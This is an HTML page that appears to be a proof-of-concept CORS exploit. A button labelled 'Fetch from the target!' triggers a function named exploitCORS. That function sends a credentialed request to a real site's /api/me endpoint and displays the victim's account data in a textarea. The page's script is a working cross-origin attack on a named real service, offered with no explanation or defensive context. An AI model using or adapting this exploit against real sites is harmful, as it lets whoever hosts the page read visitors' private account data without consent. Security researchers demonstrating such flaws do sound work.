<!DOCTYPE html>
<html>
<head>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f0f0;
      margin: 0;
      padding: 0;
    }

    center {
      text-align: center;
      margin: 50px auto;
      width: 80%;
    }

    button {
      background-color: #0074cc;
      color: #fff;
      padding: 10px 20px;
      font-size: 16px;
      border: none;
      cursor: pointer;
      border-radius: 5px;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #005aa3;
    }

    hr {
      background-color: #0074cc;
    }

    textarea {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      resize: none;
    }

    textarea:focus {
      outline: none;
    }
  </style>
</head>
<body>
  <center>
    <button id="fetchButton">Fetch from the target!</button>
    <hr size="1" width="80%">
    <textarea id="fetchedResource" rows="10" cols="50" placeholder="Click on the button to fetch the resource!"></textarea>
  </center>

  <script>
    document.getElementById('fetchButton').addEventListener('click', exploitCORS);

    function exploitCORS() {
      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open('get', 'https://www.squarespace.com/api/me', true);
      req.withCredentials = true;
      req.send();
    }

    function reqListener() {
      document.getElementById('fetchedResource').value = this.responseText;
    }
  </script>
</body>
</html>
